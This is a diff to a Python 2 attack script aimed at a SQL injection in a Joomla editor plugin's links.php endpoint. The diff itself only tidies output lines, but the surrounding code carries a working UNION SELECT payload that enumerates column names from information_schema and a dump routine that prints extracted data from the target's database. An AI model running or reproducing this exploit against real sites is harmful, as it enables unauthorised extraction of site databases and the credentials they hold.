@@ -60,7 +60,7 @@ def tables(url):
 def columns(url,table):
 	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
 	time.sleep(1)
-	print HIJAU+"[+] Get the columns name"+TUTUP
+	print warna.HIJAU+"[+] Get the columns name"+warna.TUTUP
 	payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+where+table_name='{}'--%20aa".format(table)
 	cek = requests.get(url+payload).text
 	soup = BeautifulSoup(cek,'html.parser')
@@ -83,7 +83,7 @@ def dump(url,column,table):
 	cek = requests.get(url+payload).text
 	soup = BeautifulSoup(cek,'html.parser')
 	find = soup.find_all('node')
-	print "------------=======["+column[0]+" ::: "+column[1]+"]=======-----------"
+	print "------------=======[Columns]=======-----------"
 	for db in find:
 		print "- "+db.get('url')
 	print "------------=======[Column]=======-----------"
